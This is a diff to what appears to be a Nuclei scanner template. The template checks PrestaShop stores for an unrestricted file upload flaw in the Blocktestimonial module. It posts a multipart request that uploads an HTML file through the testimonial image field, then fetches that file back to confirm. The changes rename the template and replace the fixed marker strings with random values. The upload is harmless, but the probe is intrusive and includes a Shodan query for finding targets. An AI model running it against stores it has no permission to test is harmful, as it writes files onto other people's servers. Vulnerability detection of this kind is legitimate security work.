@@ -1,7 +1,7 @@
-id: prestashop-blocktestimonial-modules-file-upload
+id: prestashop-blocktestimonial-file-upload
 
 info:
-  name: Prestashop Blocktestimonial Modules File Upload
+  name: Prestashop Blocktestimonial Modules - File Upload Vulnerability
   author: MaStErChO
   severity: critical
   reference:
@@ -11,9 +11,12 @@ info:
   metadata:
     framework: prestashop
     shodan-query: http.component:"prestashop"
-  tags: intrusive,file-upload,php,prestashop
+  tags: intrusive,file-upload,blocktestimonial,prestashop
+
 variables:
   filename: '{{rand_base(7, "abc")}}'
+  data: '{{rand_base(6, "abc")}}'
+
 http:
   - raw:
       - |
@@ -24,22 +27,22 @@ http:
         ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
         Content-Disposition: form-data; name="testimonial_submitter_name"
 
-        nuclei
+        {{data}}
         ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
         Content-Disposition: form-data; name="testimonial_title"
 
-        tested by nuclei
+        {{data}}
         ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
         Content-Disposition: form-data; name="testimonial_main_message"
 
-        tested by nuclei
+        {{data}}
         ------WebKitFormBoundaryLSo7Btb6nGcpR9Cl
         Content-Disposition: form-data; name="testimonial_img"; filename="{{filename}}.html"
         Content-Type: text/html
 
         <html>
         <body>
-        <h1>Nuclei Check</h1>
+        <h1>{{data}}</h1>
         </body>
         </html>
 
@@ -56,10 +59,11 @@ http:
     matchers-condition: and
     matchers:
       - type: word
+        part: body_1
         words:
           - "Your testimonial was submitted successfully."
-        part: body_1
+
       - type: word
-        words:
-          - "<h1>Nuclei Check</h1>"
         part: body_2
+        words:
+          - "{{data}}"
